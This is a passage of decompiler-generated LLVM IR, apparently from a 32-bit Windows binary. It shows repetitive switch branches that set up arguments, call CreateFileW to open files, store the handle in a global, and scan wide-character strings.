  %218 = inttoptr i32 %217 to i32*, !insn.addr !1086
  store i32 0, i32* %218, align 4, !insn.addr !1086
  %219 = add i32 %esp.3.reload, -8, !insn.addr !1087
  %220 = inttoptr i32 %219 to i32*, !insn.addr !1087
  store i32 128, i32* %220, align 4, !insn.addr !1087
  %221 = add i32 %esp.3.reload, -12, !insn.addr !1088
  %222 = inttoptr i32 %221 to i32*, !insn.addr !1088
  store i32 4, i32* %222, align 4, !insn.addr !1088
  %223 = add i32 %esp.3.reload, -16, !insn.addr !1089
  %224 = inttoptr i32 %223 to i32*, !insn.addr !1089
  store i32 0, i32* %224, align 4, !insn.addr !1089
  %225 = add i32 %esp.3.reload, -20, !insn.addr !1090
  %226 = inttoptr i32 %225 to i32*, !insn.addr !1090
  store i32 1, i32* %226, align 4, !insn.addr !1090
  %227 = add i32 %esp.3.reload, -24, !insn.addr !1091
  %228 = inttoptr i32 %227 to i32*, !insn.addr !1091
  store i32 4, i32* %228, align 4, !insn.addr !1091
  %229 = add i32 %esp.3.reload, -28, !insn.addr !1092
  %230 = inttoptr i32 %229 to i32*, !insn.addr !1092
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %230, align 4, !insn.addr !1092
  %231 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1093
  call void @__asm_movups(i128 %231, i128 %216), !insn.addr !1093
  %232 = call i32* @CreateFileW(i16* inttoptr (i32 4522051 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1094
  %233 = ptrtoint i32* %232 to i32, !insn.addr !1094
  store i32 %233, i32* @global_var_1003e9c0, align 4, !insn.addr !1095
  store i32 %34, i32* %ecx.5.reg2mem, !insn.addr !1096
  br label %dec_label_pc_10002ea0, !insn.addr !1096

dec_label_pc_10002ea0:                            ; preds = %dec_label_pc_10002ea0, %dec_label_pc_10002e5d
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %234 = inttoptr i32 %ecx.5.reload to i16*, !insn.addr !1097
  %235 = load i16, i16* %234, align 2, !insn.addr !1097
  %236 = add i32 %ecx.5.reload, 2, !insn.addr !1098
  %237 = icmp eq i16 %235, 0, !insn.addr !1099
  %238 = icmp eq i1 %237, false, !insn.addr !1100
  store i32 %236, i32* %ecx.5.reg2mem, !insn.addr !1100
  store i32 %236, i32* %.pn.reg2mem, !insn.addr !1100
  store i32 %233, i32* %edx.6.reg2mem, !insn.addr !1100
  store i32 %229, i32* %esp.4.reg2mem, !insn.addr !1100
  br i1 %238, label %dec_label_pc_10002ea0, label %dec_label_pc_10003613, !insn.addr !1100

dec_label_pc_10002eb6:                            ; preds = %dec_label_pc_10002dc4
  %239 = add i32 %esp.3.reload, -4, !insn.addr !1101
  %240 = inttoptr i32 %239 to i32*, !insn.addr !1101
  store i32 0, i32* %240, align 4, !insn.addr !1101
  %241 = add i32 %esp.3.reload, -8, !insn.addr !1102
  %242 = inttoptr i32 %241 to i32*, !insn.addr !1102
  store i32 128, i32* %242, align 4, !insn.addr !1102
  %243 = add i32 %esp.3.reload, -12, !insn.addr !1103
  %244 = inttoptr i32 %243 to i32*, !insn.addr !1103
  store i32 4, i32* %244, align 4, !insn.addr !1103
  %245 = add i32 %esp.3.reload, -16, !insn.addr !1104
  %246 = inttoptr i32 %245 to i32*, !insn.addr !1104
  store i32 0, i32* %246, align 4, !insn.addr !1104
  %247 = add i32 %esp.3.reload, -20, !insn.addr !1105
  %248 = inttoptr i32 %247 to i32*, !insn.addr !1105
  store i32 1, i32* %248, align 4, !insn.addr !1105
  %249 = add i32 %esp.3.reload, -24, !insn.addr !1106
  %250 = inttoptr i32 %249 to i32*, !insn.addr !1106
  store i32 4, i32* %250, align 4, !insn.addr !1106
  %251 = add i32 %esp.3.reload, -28, !insn.addr !1107
  %252 = inttoptr i32 %251 to i32*, !insn.addr !1107
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %252, align 4, !insn.addr !1107
  store i128 5505115, i128* %stack_var_-108, align 8, !insn.addr !1108
  %253 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1109
  %254 = ptrtoint i32* %253 to i32, !insn.addr !1109
  store i32 %254, i32* @global_var_1003e9c0, align 4, !insn.addr !1110
  store i32 %34, i32* %ecx.6.reg2mem, !insn.addr !1111
  br label %dec_label_pc_10002ef5, !insn.addr !1111

dec_label_pc_10002ef5:                            ; preds = %dec_label_pc_10002ef5, %dec_label_pc_10002eb6
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %255 = inttoptr i32 %ecx.6.reload to i16*, !insn.addr !1112
  %256 = load i16, i16* %255, align 2, !insn.addr !1112
  %257 = add i32 %ecx.6.reload, 2, !insn.addr !1113
  %258 = icmp eq i16 %256, 0, !insn.addr !1114
  %259 = icmp eq i1 %258, false, !insn.addr !1115
  store i32 %257, i32* %ecx.6.reg2mem, !insn.addr !1115
  store i32 %257, i32* %.pn.reg2mem, !insn.addr !1115
  store i32 %254, i32* %edx.6.reg2mem, !insn.addr !1115
  store i32 %251, i32* %esp.4.reg2mem, !insn.addr !1115
  br i1 %259, label %dec_label_pc_10002ef5, label %dec_label_pc_10003613, !insn.addr !1115

dec_label_pc_10002f0b:                            ; preds = %dec_label_pc_10002dc4
  %260 = add i32 %esp.3.reload, -4, !insn.addr !1116
  %261 = inttoptr i32 %260 to i32*, !insn.addr !1116
  store i32 0, i32* %261, align 4, !insn.addr !1116
  %262 = add i32 %esp.3.reload, -8, !insn.addr !1117
  %263 = inttoptr i32 %262 to i32*, !insn.addr !1117
  store i32 128, i32* %263, align 4, !insn.addr !1117
  %264 = add i32 %esp.3.reload, -12, !insn.addr !1118
  %265 = inttoptr i32 %264 to i32*, !insn.addr !1118
  store i32 4, i32* %265, align 4, !insn.addr !1118
  %266 = add i32 %esp.3.reload, -16, !insn.addr !1119
  %267 = inttoptr i32 %266 to i32*, !insn.addr !1119
  store i32 0, i32* %267, align 4, !insn.addr !1119
  %268 = add i32 %esp.3.reload, -20, !insn.addr !1120
  %269 = inttoptr i32 %268 to i32*, !insn.addr !1120
  store i32 1, i32* %269, align 4, !insn.addr !1120
  %270 = add i32 %esp.3.reload, -24, !insn.addr !1121
  %271 = inttoptr i32 %270 to i32*, !insn.addr !1121
  store i32 4, i32* %271, align 4, !insn.addr !1121
  %272 = add i32 %esp.3.reload, -28, !insn.addr !1122
  %273 = inttoptr i32 %272 to i32*, !insn.addr !1122
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %273, align 4, !insn.addr !1122
  store i128 4391003, i128* %stack_var_-108, align 8, !insn.addr !1123
  %274 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1124
  %275 = ptrtoint i32* %274 to i32, !insn.addr !1124
  store i32 %275, i32* @global_var_1003e9c0, align 4, !insn.addr !1125
  store i32 %34, i32* %ecx.7.reg2mem, !insn.addr !1126
  br label %dec_label_pc_10002f50, !insn.addr !1126

dec_label_pc_10002f50:                            ; preds = %dec_label_pc_10002f50, %dec_label_pc_10002f0b
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %276 = inttoptr i32 %ecx.7.reload to i16*, !insn.addr !1127
  %277 = load i16, i16* %276, align 2, !insn.addr !1127
  %278 = add i32 %ecx.7.reload, 2, !insn.addr !1128
  %279 = icmp eq i16 %277, 0, !insn.addr !1129
  %280 = icmp eq i1 %279, false, !insn.addr !1130
  store i32 %278, i32* %ecx.7.reg2mem, !insn.addr !1130
  store i32 %278, i32* %.pn.reg2mem, !insn.addr !1130
  store i32 %275, i32* %edx.6.reg2mem, !insn.addr !1130
  store i32 %272, i32* %esp.4.reg2mem, !insn.addr !1130
  br i1 %280, label %dec_label_pc_10002f50, label %dec_label_pc_10003613, !insn.addr !1130

dec_label_pc_10002f66:                            ; preds = %dec_label_pc_10002dc4
  %281 = add i32 %esp.3.reload, -4, !insn.addr !1131
  %282 = inttoptr i32 %281 to i32*, !insn.addr !1131
  store i32 0, i32* %282, align 4, !insn.addr !1131
  %283 = add i32 %esp.3.reload, -8, !insn.addr !1132
  %284 = inttoptr i32 %283 to i32*, !insn.addr !1132
  store i32 128, i32* %284, align 4, !insn.addr !1132
  %285 = add i32 %esp.3.reload, -12, !insn.addr !1133
  %286 = inttoptr i32 %285 to i32*, !insn.addr !1133
  store i32 4, i32* %286, align 4, !insn.addr !1133
  %287 = add i32 %esp.3.reload, -16, !insn.addr !1134
  %288 = inttoptr i32 %287 to i32*, !insn.addr !1134
  store i32 0, i32* %288, align 4, !insn.addr !1134
  %289 = add i32 %esp.3.reload, -20, !insn.addr !1135
  %290 = inttoptr i32 %289 to i32*, !insn.addr !1135
  store i32 1, i32* %290, align 4, !insn.addr !1135
  %291 = add i32 %esp.3.reload, -24, !insn.addr !1136
  %292 = inttoptr i32 %291 to i32*, !insn.addr !1136
  store i32 4, i32* %292, align 4, !insn.addr !1136
  %293 = add i32 %esp.3.reload, -28, !insn.addr !1137
  %294 = inttoptr i32 %293 to i32*, !insn.addr !1137
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %294, align 4, !insn.addr !1137
  store i128 4456539, i128* %stack_var_-108, align 8, !insn.addr !1138
  %295 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1139
  %296 = ptrtoint i32* %295 to i32, !insn.addr !1139
  store i32 %296, i32* @global_var_1003e9c0, align 4, !insn.addr !1140
  store i32 %34, i32* %ecx.8.reg2mem, !insn.addr !1141
  br label %dec_label_pc_10002fa5, !insn.addr !1141

dec_label_pc_10002fa5:                            ; preds = %dec_label_pc_10002fa5, %dec_label_pc_10002f66
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %297 = inttoptr i32 %ecx.8.reload to i16*, !insn.addr !1142
  %298 = load i16, i16* %297, align 2, !insn.addr !1142
  %299 = add i32 %ecx.8.reload, 2, !insn.addr !1143
  %300 = icmp eq i16 %298, 0, !insn.addr !1144
  %301 = icmp eq i1 %300, false, !insn.addr !1145
  store i32 %299, i32* %ecx.8.reg2mem, !insn.addr !1145
  store i32 %299, i32* %.pn.reg2mem, !insn.addr !1145
  store i32 %296, i32* %edx.6.reg2mem, !insn.addr !1145
  store i32 %293, i32* %esp.4.reg2mem, !insn.addr !1145
  br i1 %301, label %dec_label_pc_10002fa5, label %dec_label_pc_10003613, !insn.addr !1145

dec_label_pc_10002fbb:                            ; preds = %dec_label_pc_10002dc4
  %302 = call i32 @function_10002800(), !insn.addr !1146
  store i32 183, i32* %.pre-phi.reg2mem, !insn.addr !1147
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1147
  br label %dec_label_pc_1000362f, !insn.addr !1147

dec_label_pc_10002fca:                            ; preds = %dec_label_pc_10002dc4
  %303 = call i32 @function_10002800(), !insn.addr !1148
  store i32 188, i32* %.pre-phi.reg2mem, !insn.addr !1149
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1149
  br label %dec_label_pc_1000362f, !insn.addr !1149

dec_label_pc_10002fd9:                            ; preds = %dec_label_pc_10002dc4
  %304 = call i32 @function_10002800(), !insn.addr !1150
  store i32 189, i32* %.pre-phi.reg2mem, !insn.addr !1151
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1151
  br label %dec_label_pc_1000362f, !insn.addr !1151

dec_label_pc_10003024:                            ; preds = %dec_label_pc_10002dc4
  %305 = add i32 %esp.3.reload, -4, !insn.addr !1152
  %306 = inttoptr i32 %305 to i32*, !insn.addr !1152
  store i32 0, i32* %306, align 4, !insn.addr !1152
  %307 = add i32 %esp.3.reload, -8, !insn.addr !1153
  %308 = inttoptr i32 %307 to i32*, !insn.addr !1153
  store i32 128, i32* %308, align 4, !insn.addr !1153
  %309 = add i32 %esp.3.reload, -12, !insn.addr !1154
  %310 = inttoptr i32 %309 to i32*, !insn.addr !1154
  store i32 4, i32* %310, align 4, !insn.addr !1154
  %311 = add i32 %esp.3.reload, -16, !insn.addr !1155
  %312 = inttoptr i32 %311 to i32*, !insn.addr !1155
  store i32 0, i32* %312, align 4, !insn.addr !1155
  %313 = add i32 %esp.3.reload, -20, !insn.addr !1156
  %314 = inttoptr i32 %313 to i32*, !insn.addr !1156
  store i32 1, i32* %314, align 4, !insn.addr !1156
  %315 = add i32 %esp.3.reload, -24, !insn.addr !1157
  %316 = inttoptr i32 %315 to i32*, !insn.addr !1157
  store i32 4, i32* %316, align 4, !insn.addr !1157
  %317 = add i32 %esp.3.reload, -28, !insn.addr !1158
  %318 = inttoptr i32 %317 to i32*, !insn.addr !1158
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %318, align 4, !insn.addr !1158
  %319 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1159
  %320 = ptrtoint i32* %319 to i32, !insn.addr !1159
  %321 = add i32 %esp.3.reload, -32, !insn.addr !1160
  %322 = inttoptr i32 %321 to i32*, !insn.addr !1160
  store i32 0, i32* %322, align 4, !insn.addr !1160
  %323 = add i32 %esp.3.reload, -36, !insn.addr !1161
  %324 = inttoptr i32 %323 to i32*, !insn.addr !1161
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %324, align 4, !insn.addr !1161
  %325 = add i32 %esp.3.reload, -40, !insn.addr !1162
  %326 = inttoptr i32 %325 to i32*, !insn.addr !1162
  store i32 2, i32* %326, align 4, !insn.addr !1162
  %327 = add i32 %esp.3.reload, -44, !insn.addr !1163
  %328 = inttoptr i32 %327 to i32*, !insn.addr !1163
  store i32 ptrtoint (i32* @global_var_100392f8 to i32), i32* %328, align 4, !insn.addr !1163
  store i32 %320, i32* @global_var_1003e9c0, align 4, !insn.addr !1164
  %329 = add i32 %esp.3.reload, -48, !insn.addr !1165
  %330 = inttoptr i32 %329 to i32*, !insn.addr !1165
  store i32 %320, i32* %330, align 4, !insn.addr !1165
  store i32 %329, i32* %esp.5.reg2mem, !insn.addr !1166
  br label %dec_label_pc_10003625, !insn.addr !1166

dec_label_pc_10003053:                            ; preds = %dec_label_pc_10002dc4
  %331 = call i32 @function_10002800(), !insn.addr !1167
  store i32 185, i32* %.pre-phi.reg2mem, !insn.addr !1168
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1168
  br label %dec_label_pc_1000362f, !insn.addr !1168

dec_label_pc_10003062:                            ; preds = %dec_label_pc_10002dc4
  %332 = add i32 %esp.3.reload, -4, !insn.addr !1169
  %333 = inttoptr i32 %332 to i32*, !insn.addr !1169
  store i32 0, i32* %333, align 4, !insn.addr !1169
  %334 = add i32 %esp.3.reload, -8, !insn.addr !1170
  %335 = inttoptr i32 %334 to i32*, !insn.addr !1170
  store i32 128, i32* %335, align 4, !insn.addr !1170
  %336 = add i32 %esp.3.reload, -12, !insn.addr !1171
  %337 = inttoptr i32 %336 to i32*, !insn.addr !1171
  store i32 4, i32* %337, align 4, !insn.addr !1171
  %338 = add i32 %esp.3.reload, -16, !insn.addr !1172
  %339 = inttoptr i32 %338 to i32*, !insn.addr !1172
  store i32 0, i32* %339, align 4, !insn.addr !1172
  %340 = add i32 %esp.3.reload, -20, !insn.addr !1173
  %341 = inttoptr i32 %340 to i32*, !insn.addr !1173
  store i32 1, i32* %341, align 4, !insn.addr !1173
  %342 = add i32 %esp.3.reload, -24, !insn.addr !1174
  %343 = inttoptr i32 %342 to i32*, !insn.addr !1174
  store i32 4, i32* %343, align 4, !insn.addr !1174
  %344 = add i32 %esp.3.reload, -28, !insn.addr !1175
  %345 = inttoptr i32 %344 to i32*, !insn.addr !1175
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %345, align 4, !insn.addr !1175
  %346 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1176
  %347 = ptrtoint i32* %346 to i32, !insn.addr !1176
  %348 = add i32 %esp.3.reload, -32, !insn.addr !1177
  %349 = inttoptr i32 %348 to i32*, !insn.addr !1177
  store i32 0, i32* %349, align 4, !insn.addr !1177
  %350 = add i32 %esp.3.reload, -36, !insn.addr !1178
  %351 = inttoptr i32 %350 to i32*, !insn.addr !1178
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %351, align 4, !insn.addr !1178
  %352 = add i32 %esp.3.reload, -40, !insn.addr !1179
  %353 = inttoptr i32 %352 to i32*, !insn.addr !1179
  store i32 2, i32* %353, align 4, !insn.addr !1179
  %354 = add i32 %esp.3.reload, -44, !insn.addr !1180
  %355 = inttoptr i32 %354 to i32*, !insn.addr !1180
  store i32 ptrtoint (i32* @global_var_100392fc to i32), i32* %355, align 4, !insn.addr !1180
  store i32 %347, i32* @global_var_1003e9c0, align 4, !insn.addr !1181
  %356 = add i32 %esp.3.reload, -48, !insn.addr !1182
  %357 = inttoptr i32 %356 to i32*, !insn.addr !1182
  store i32 %347, i32* %357, align 4, !insn.addr !1182
  store i32 %356, i32* %esp.5.reg2mem, !insn.addr !1183
  br label %dec_label_pc_10003625, !insn.addr !1183

dec_label_pc_10003091:                            ; preds = %dec_label_pc_10002dc4
  %358 = call i32 @function_10002800(), !insn.addr !1184
  store i32 187, i32* %.pre-phi.reg2mem, !insn.addr !1185
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1185
  br label %dec_label_pc_1000362f, !insn.addr !1185

dec_label_pc_100030a0:                            ; preds = %dec_label_pc_10002dc4
  %359 = add i32 %esp.3.reload, -4, !insn.addr !1186
  %360 = inttoptr i32 %359 to i32*, !insn.addr !1186
  store i32 0, i32* %360, align 4, !insn.addr !1186
  %361 = add i32 %esp.3.reload, -8, !insn.addr !1187
  %362 = inttoptr i32 %361 to i32*, !insn.addr !1187
  store i32 128, i32* %362, align 4, !insn.addr !1187
  %363 = add i32 %esp.3.reload, -12, !insn.addr !1188
  %364 = inttoptr i32 %363 to i32*, !insn.addr !1188
  store i32 4, i32* %364, align 4, !insn.addr !1188
  %365 = add i32 %esp.3.reload, -16, !insn.addr !1189
  %366 = inttoptr i32 %365 to i32*, !insn.addr !1189
  store i32 0, i32* %366, align 4, !insn.addr !1189
  %367 = add i32 %esp.3.reload, -20, !insn.addr !1190
  %368 = inttoptr i32 %367 to i32*, !insn.addr !1190
  store i32 1, i32* %368, align 4, !insn.addr !1190
  %369 = add i32 %esp.3.reload, -24, !insn.addr !1191
  %370 = inttoptr i32 %369 to i32*, !insn.addr !1191
  store i32 4, i32* %370, align 4, !insn.addr !1191
  %371 = add i32 %esp.3.reload, -28, !insn.addr !1192
  %372 = inttoptr i32 %371 to i32*, !insn.addr !1192
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %372, align 4, !insn.addr !1192
  %373 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1193
  %374 = ptrtoint i32* %373 to i32, !insn.addr !1193
  %375 = add i32 %esp.3.reload, -32, !insn.addr !1194
  %376 = inttoptr i32 %375 to i32*, !insn.addr !1194
  store i32 0, i32* %376, align 4, !insn.addr !1194
  %377 = add i32 %esp.3.reload, -36, !insn.addr !1195
  %378 = inttoptr i32 %377 to i32*, !insn.addr !1195
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %378, align 4, !insn.addr !1195
  %379 = add i32 %esp.3.reload, -40, !insn.addr !1196
  %380 = inttoptr i32 %379 to i32*, !insn.addr !1196
  store i32 2, i32* %380, align 4, !insn.addr !1196
  %381 = add i32 %esp.3.reload, -44, !insn.addr !1197
  %382 = inttoptr i32 %381 to i32*, !insn.addr !1197
  store i32 ptrtoint (i32* @global_var_10039300 to i32), i32* %382, align 4, !insn.addr !1197
  store i32 %374, i32* @global_var_1003e9c0, align 4, !insn.addr !1198
  %383 = add i32 %esp.3.reload, -48, !insn.addr !1199
  %384 = inttoptr i32 %383 to i32*, !insn.addr !1199
  store i32 %374, i32* %384, align 4, !insn.addr !1199
  store i32 %383, i32* %esp.5.reg2mem, !insn.addr !1200
  br label %dec_label_pc_10003625, !insn.addr !1200

dec_label_pc_100030cf:                            ; preds = %dec_label_pc_10002dc4
  %385 = add i32 %esp.3.reload, -4, !insn.addr !1201
  %386 = inttoptr i32 %385 to i32*, !insn.addr !1201
  store i32 0, i32* %386, align 4, !insn.addr !1201
  %387 = add i32 %esp.3.reload, -8, !insn.addr !1202
  %388 = inttoptr i32 %387 to i32*, !insn.addr !1202
  store i32 128, i32* %388, align 4, !insn.addr !1202
  %389 = add i32 %esp.3.reload, -12, !insn.addr !1203
  %390 = inttoptr i32 %389 to i32*, !insn.addr !1203
  store i32 4, i32* %390, align 4, !insn.addr !1203
  %391 = add i32 %esp.3.reload, -16, !insn.addr !1204
  %392 = inttoptr i32 %391 to i32*, !insn.addr !1204
  store i32 0, i32* %392, align 4, !insn.addr !1204
  %393 = add i32 %esp.3.reload, -20, !insn.addr !1205
  %394 = inttoptr i32 %393 to i32*, !insn.addr !1205
  store i32 1, i32* %394, align 4, !insn.addr !1205
  %395 = add i32 %esp.3.reload, -24, !insn.addr !1206
  %396 = inttoptr i32 %395 to i32*, !insn.addr !1206
  store i32 4, i32* %396, align 4, !insn.addr !1206
  %397 = add i32 %esp.3.reload, -28, !insn.addr !1207
  %398 = inttoptr i32 %397 to i32*, !insn.addr !1207
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %398, align 4, !insn.addr !1207
  %399 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1208
  %400 = ptrtoint i32* %399 to i32, !insn.addr !1208
  %401 = add i32 %esp.3.reload, -32, !insn.addr !1209
  %402 = inttoptr i32 %401 to i32*, !insn.addr !1209
  store i32 0, i32* %402, align 4, !insn.addr !1209
  %403 = add i32 %esp.3.reload, -36, !insn.addr !1210
  %404 = inttoptr i32 %403 to i32*, !insn.addr !1210
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %404, align 4, !insn.addr !1210
  %405 = add i32 %esp.3.reload, -40, !insn.addr !1211
  %406 = inttoptr i32 %405 to i32*, !insn.addr !1211
  store i32 2, i32* %406, align 4, !insn.addr !1211
  %407 = add i32 %esp.3.reload, -44, !insn.addr !1212
  %408 = inttoptr i32 %407 to i32*, !insn.addr !1212
  store i32 ptrtoint (i32* @global_var_10039304 to i32), i32* %408, align 4, !insn.addr !1212
  store i32 %400, i32* @global_var_1003e9c0, align 4, !insn.addr !1213
  %409 = add i32 %esp.3.reload, -48, !insn.addr !1214
  %410 = inttoptr i32 %409 to i32*, !insn.addr !1214
  store i32 %400, i32* %410, align 4, !insn.addr !1214
  store i32 %409, i32* %esp.5.reg2mem, !insn.addr !1215
  br label %dec_label_pc_10003625, !insn.addr !1215

dec_label_pc_100030fe:                            ; preds = %dec_label_pc_10002dc4, %dec_label_pc_10002dc4, %dec_label_pc_10002dc4
  %411 = add i32 %esp.3.reload, -4, !insn.addr !1216
  %412 = inttoptr i32 %411 to i32*, !insn.addr !1216
  store i32 0, i32* %412, align 4, !insn.addr !1216
  %413 = add i32 %esp.3.reload, -8, !insn.addr !1217
  %414 = inttoptr i32 %413 to i32*, !insn.addr !1217
  store i32 128, i32* %414, align 4, !insn.addr !1217
  %415 = add i32 %esp.3.reload, -12, !insn.addr !1218
  %416 = inttoptr i32 %415 to i32*, !insn.addr !1218
  store i32 4, i32* %416, align 4, !insn.addr !1218
  %417 = add i32 %esp.3.reload, -16, !insn.addr !1219
  %418 = inttoptr i32 %417 to i32*, !insn.addr !1219
  store i32 0, i32* %418, align 4, !insn.addr !1219
  %419 = add i32 %esp.3.reload, -20, !insn.addr !1220
  %420 = inttoptr i32 %419 to i32*, !insn.addr !1220
  store i32 1, i32* %420, align 4, !insn.addr !1220
  %421 = add i32 %esp.3.reload, -24, !insn.addr !1221
  %422 = inttoptr i32 %421 to i32*, !insn.addr !1221
  store i32 4, i32* %422, align 4, !insn.addr !1221
  %423 = add i32 %esp.3.reload, -28, !insn.addr !1222
  %424 = inttoptr i32 %423 to i32*, !insn.addr !1222
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %424, align 4, !insn.addr !1222
  %425 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1223
  %426 = ptrtoint i32* %425 to i32, !insn.addr !1223
  %427 = add i32 %esp.3.reload, -32, !insn.addr !1224
  %428 = inttoptr i32 %427 to i32*, !insn.addr !1224
  store i32 0, i32* %428, align 4, !insn.addr !1224
  %429 = add i32 %esp.3.reload, -36, !insn.addr !1225
  %430 = inttoptr i32 %429 to i32*, !insn.addr !1225
  store i32 ptrtoint (i32* @global_var_100410a0 to i32), i32* %430, align 4, !insn.addr !1225
  %431 = add i32 %esp.3.reload, -40, !insn.addr !1226
  %432 = inttoptr i32 %431 to i32*, !insn.addr !1226
  store i32 2, i32* %432, align 4, !insn.addr !1226
  %433 = add i32 %esp.3.reload, -44, !insn.addr !1227
  %434 = inttoptr i32 %433 to i32*, !insn.addr !1227
  store i32 ptrtoint (i32* @global_var_10039308 to i32), i32* %434, align 4, !insn.addr !1227
  store i32 %426, i32* @global_var_1003e9c0, align 4, !insn.addr !1228
  %435 = add i32 %esp.3.reload, -48, !insn.addr !1229
  %436 = inttoptr i32 %435 to i32*, !insn.addr !1229
  store i32 %426, i32* %436, align 4, !insn.addr !1229
  store i32 %435, i32* %esp.5.reg2mem, !insn.addr !1230
  br label %dec_label_pc_10003625, !insn.addr !1230

dec_label_pc_1000312d:                            ; preds = %dec_label_pc_10002dc4
  %437 = add i32 %esp.3.reload, -4, !insn.addr !1231
  %438 = inttoptr i32 %437 to i32*, !insn.addr !1231
  store i32 0, i32* %438, align 4, !insn.addr !1231
  %439 = add i32 %esp.3.reload, -8, !insn.addr !1232
  %440 = inttoptr i32 %439 to i32*, !insn.addr !1232
  store i32 128, i32* %440, align 4, !insn.addr !1232
  %441 = add i32 %esp.3.reload, -12, !insn.addr !1233
  %442 = inttoptr i32 %441 to i32*, !insn.addr !1233
  store i32 4, i32* %442, align 4, !insn.addr !1233
  %443 = add i32 %esp.3.reload, -16, !insn.addr !1234
  %444 = inttoptr i32 %443 to i32*, !insn.addr !1234
  store i32 0, i32* %444, align 4, !insn.addr !1234
  %445 = add i32 %esp.3.reload, -20, !insn.addr !1235
  %446 = inttoptr i32 %445 to i32*, !insn.addr !1235
  store i32 1, i32* %446, align 4, !insn.addr !1235
  %447 = add i32 %esp.3.reload, -24, !insn.addr !1236
  %448 = inttoptr i32 %447 to i32*, !insn.addr !1236
  store i32 4, i32* %448, align 4, !insn.addr !1236
  %449 = add i32 %esp.3.reload, -28, !insn.addr !1237
  %450 = inttoptr i32 %449 to i32*, !insn.addr !1237
  store i32 ptrtoint (i16** @global_var_10040d98 to i32), i32* %450, align 4, !insn.addr !1237
  %451 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1238
  %452 = ptrtoint i32* %451 to i32, !insn.addr !1238
  %453 = add i32 %esp.3.reload, -32, !insn.addr !1239
  %454 = inttoptr i32 %453 to i32*, !insn.addr !1239
  store i32 0, i32* %454, align 4, !insn.addr !1239
  %455 = add i32 %esp.3.reload, -36, !insn.addr !1240
